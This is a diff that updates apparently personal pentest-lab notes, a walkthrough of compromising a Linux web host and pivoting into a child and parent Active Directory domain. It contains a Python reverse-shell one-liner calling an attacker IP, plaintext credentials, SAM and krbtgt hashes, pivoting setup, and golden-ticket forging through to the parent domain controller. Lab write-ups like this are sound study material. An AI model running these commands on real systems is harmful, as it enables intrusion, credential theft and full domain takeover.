@@ -9,7 +9,9 @@ USE THE TOOLS  PROVIDED BY THE COURSE
 ### Discover the hosts
 
 ```bash
-nmap -sn IP/MASK
+nmap -sn 192.168.80.0/24
+
+Nmap scan report for 192.168.80.10
 ```
 
 
@@ -17,7 +19,7 @@ nmap -sn IP/MASK
 ### Port Scan
 
 ```bash
-nmap -sC -sV IP
+nmap -sC -sV 192.168.80.10
 ```
 
 
@@ -32,9 +34,14 @@ Intercept the request with Burp Suite to try get some injection
 
 ### SSRF
 
-...
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-
+{% code overflow="wrap" %}
+```bash
+# rev shell payload
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.200.56",9009));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+{% endcode %}
 
 
 
@@ -56,14 +63,64 @@ Manual enumeration for linux priv esc
 sudo -l
 ```
 
+### Find Juicy files
 
+```
+```
+
+```bash
+# from linpeas output
+/var/www/html/config.php:        $password = 'Web!@#$%';
+
+cat /var/www/html/config.php
+
+$host = "localhost";  
+$user = "root";  
+$password = 'Web!@#$%';  
+$db_name = "pro";
+
+# db access
+mysql -u root -p
+> 'Web!@#$%'
+```
+
+
+
+```bash
+cat /etc/passwd
+
+privilege:x:1001:1001:Admin@962:/home/privilege:/bin/bash
+```
+
+### Find another networks
+
+```
+ifconfig 
+
+ens32: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.80.10  netmask 255.255.255.0  broadcast 192.168.80.255
+        ether 00:50:56:96:62:dd  txqueuelen 1000  (Ethernet)
+        RX packets 74767  bytes 5457705 (5.4 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 75028  bytes 9385433 (9.3 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+ens34: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.98.15  netmask 255.255.255.0  broadcast 192.168.98.255
+        ether 00:50:56:96:e4:32  txqueuelen 1000  (Ethernet)
+        RX packets 48  bytes 9651 (9.6 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 41  bytes 3554 (3.5 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+        device interrupt 16  base 0x1000 
+```
 
 ### Scan another network
 
 if the pwnd machine has 2 or more network interface we can use NMAP on victim machine (if it's installed) and discover another hosts.&#x20;
 
 ```bash
-nmap -sn NETWORK_2/MASK
+nmap -sn 192.168.98.15/24
 ```
 
 When we find some computers on that network we can perform further scan with nmap
@@ -91,6 +148,7 @@ If we have a .mozilla directory, the dir might contains some interesting data.
 
 We can check into the bookmarks.
 
+{% code overflow="wrap" %}
 ```bash
 cd ~/.mozilla/firefox/...default-release
 ls
@@ -98,11 +156,71 @@ sqlite3 places.sqlite
 
 > .tables
 > SELECT * FROM moz_bookmarks;
+
+'18|1|16|5|0|http://192.168.98.30/admin/index.php?user=john@child.warfare.corp&pass=User1@#$%6|||1737028407427000|1737029666390000|tuXr2pTr03P2|1|7'
+
 ```
+{% endcode %}
 
 
 
 ## Pivoting&#x20;
+
+### Ligolo-ng
+
+{% code overflow="wrap" %}
+```bash
+#Attacker Machine, download proxy & agent :
+#Proxy
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
+
+tar -xvzf ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
+
+#Agent
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
+
+python3 -m http.server 8080
+
+wget http://10.10.200.56:80/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
+tar -xvzf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
+```
+{% endcode %}
+
+Set up the attacker machine
+
+```bash
+sudo ip tuntap add user $YOUR_USER mode tun ligolo
+
+#Delete the 192.168.98.0/24 IP Range from the tun0 interface :
+sudo ip route del 192.168.98.0/24 dev tun0
+
+#Up the ligolo interface :
+sudo ip link set ligolo up
+
+#Add 192.168.98.0/24 IP range to the ligolo interface :
+sudo ip route add 192.168.98.0/24 dev ligolo
+```
+
+
+
+```bash
+# start the proxy on attacker machine
+./proxy -selfcert -laddr 0.0.0.0:443
+
+# start the agent on the target machine
+./agent -connect 10.10.200.X:443 -ignore-cert
+```
+
+
+
+On the ligolo-ng proxy, check the session & start the tunnel.
+
+```bash
+session
+start
+```
+
+
 
 ### SSH
 
@@ -134,7 +252,7 @@ Now using `proxychains` we can access to all port of all other network machines.
 proxychains nc -nv $VICTIM2_IP $PORT_TO_FORWARD_ON_VICTIM2
 
 # use nmap through the pivoting
-proxychains nmap -sT $VICTIM2_IP
+proxychains nmap -sT 192.168.98.30
 
 # this command allow us to access via RDP to other machine in other network
 proxychains rdesktop $VICTIM2_IP
@@ -167,6 +285,9 @@ conda create -n rpivot python=2.7
 python2 server.py --server-port $SERVER_PORT --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port $PROXY_PORT # (ex SERVER_PORT = 9980 and PROXY_PORT 9050)
 # server_port = expose port from receiving client connection
 # proxy_port = port which will be use by proxychains
+
+#ex
+python2 server.py --server-port 8899 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 9050
 ```
 {% endcode %}
 
@@ -188,6 +309,9 @@ python --version # check python version
 
 # conect to the rpivot server
 python client.py --server-ip $ATT_IP --server-port $SERVER_PORT
+
+#ex
+python2 client.py --server-ip 10.10.200.56 --server-port 8899
 ```
 
 When the connection has been initialized, we have to add this configuration to proxychain conf file.
@@ -210,11 +334,19 @@ proxychains nmap -sT $VICTIM2_IP
 
 # this command allow us to access via RDP to other machine in other network
 proxychains rdesktop $VICTIM2_IP
+
+# pivot network discovery
+proxychains nmap -sn 192.168.98.15/24
 ```
 
 
 
 ## Internal Access
+
+```
+# with active ligolo-ng
+nmap -sT 192.168.98.30
+```
 
 <figure><img src="../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>
 
@@ -224,6 +356,51 @@ We can use the credentials found to try the access to Windows machine discovered
 
 ```bash
 proxychains crackmapexec smb $TARGET_IP -u $USER -p $PASS
+
+# with ligolo
+crackmapexec smb 192.168.98.30 -u john -p "User1@#$%6"
+```
+
+
+
+### Enumeration with credentials in AD machine
+
+```bash
+impacket-secretsdump 'john@192.168.98.30'
+> User1@#$%6
+
+*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:69865e966bb089639e9b1c7f719427fa:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:169a376cbed3e83e5ea8eec2d248ce0c:::
+[*] Dumping cached domain logon information (domain/username:hash)
+CHILD.WARFARE.CORP/john:$DCC2$10240#john#9855312d42ee254a7334845613120e61: (2025-01-17 14:47:56)
+CHILD.WARFARE.CORP/corpmngr:$DCC2$10240#corpmngr#7fd50bbab99e8ea7ae9c1899f6dea7c6: (2025-01-21 11:35:46)
+
+[*] _SC_SNMPTRAP 
+corpmngr@child.warfare.corp:User4&*&*
+```
+
+```bash
+crackmapexec smb ad_hosts.txt  -u john -p 'User1@#$%6'
+
+SMB         192.168.98.120  445    CDC              [+] child.warfare.corp\john:User1@#$%6 
+SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\john:User1@#$%6 (Pwn3d!)
+
+crackmapexec smb ad_hosts.txt  -u corpmngr -p 'User4&*&*'
+
+SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\corpmngr:User4&*&* 
+SMB         192.168.98.120  445    CDC              [+] child.warfare.corp\corpmngr:User4&*&* (Pwn3d!)
+
+```
+
+```
+impacket-secretsdump 'corpmngr@192.168.98.120'
+
+User4&*&*
+
+
 ```
 
 
@@ -234,6 +411,15 @@ With the validated credentials we can try to establish a connection with `impack
 
 ```bash
 proxychains impacket-psexec '$DOMAIN/$USER:$PASS@$TARGET_IP'
+
+# with ligolo
+impacket-psexec "john@192.168.98.30"
+> User1@#$%6
+```
+
+```
+impacket-psexec 'corpmngr@192.168.98.120'
+> User4&*&*
 ```
 
 
@@ -251,6 +437,8 @@ and view if there are another DC.
 <figure><img src="../.gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>
 
 Try to ping that and we have just discover another machine.
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 Check the domain groups
 
@@ -331,7 +519,11 @@ Requirements:
 * get krbtgt hash
 
 ```bash
-proxychains impacket-secretdump 'DOMAIN/$USER@$DC_IP' -hashes :$LM
+impacket-secretsdump 'corpmngr@192.168.98.120'
+> User4&*&*
+
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900:::
+krbtgt:aes256-cts-hmac-sha1-96:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2
 ```
 
 * SID of both child and parent machine
@@ -340,6 +532,13 @@ proxychains impacket-secretdump 'DOMAIN/$USER@$DC_IP' -hashes :$LM
 # with PowerView
 Get-DomainSID -Domain child.DOMAIN.com
 Get-DomainSID -Domain DOMAIN.com
+
+# from kali machine
+impacket-lookupsid child/corpmngr:'User4&*&*'@child.warfare.corp
+[*] Domain SID is: S-1-5-21-3754860944-83624914-1883974761
+
+impacket-lookupsid child/corpmngr:'User4&*&*'@warfare.corp
+[*] Domain SID is: S-1-5-21-3375883379-808943238-3239386119
 ```
 
 ### Craft golden ticket
@@ -349,14 +548,56 @@ Get-DomainSID -Domain DOMAIN.com
 .\mimi.exe
 
 kerberos::golden /user:Administrator /domain:$CURRENT_DOMAIN /sid:$SID /sids:$PARENT_DOMAIN_SID-519 /aes256:$KRBTGT_AES256 /startoffset:-5 /endin:600 /renew:10080 /ptt
+
+# using Ticketer
+impacket-ticketer -domain child.warfare.corp -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 -domain-sid S-1-5-21-3754860944-83624914-1883974761 -groups 516 -user-id 1106 -extra-sid S-1-5-21-3375883379-808943238-3239386119-516,S-1-5-9 'corpmngr'
+
+
 ```
 {% endcode %}
+
+
 
 Check the tickets in the session
 
 ```
 klist
 ```
+
+or if we used ticketer add ccache file to var
+
+{% code overflow="wrap" %}
+```bash
+export KRB5CCNAME=corpmngr.ccache
+
+# get Service Ticket
+impacket-getST -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/corpmngr -debug
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```bash
+export KRB5CCNAME=corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
+
+impacket-secretsdump -k -no-pass dc01.warfare.corp -just-dc-user 'warfare\Administrator' -debug
+
+# output 
+[+] Decrypting hash for user: CN=Administrator,CN=Users,DC=warfare,DC=corp
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcfdfd60:::
+```
+{% endcode %}
+
+PsExec with LM hash
+
+{% code overflow="wrap" %}
+```bash
+impacket-psexec 'warfare/Administrator@dc01.warfare.corp' -hashes aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcfdfd60
+```
+{% endcode %}
+
+
+
+
 
 And now use it to access to Parent Domain Controller
 
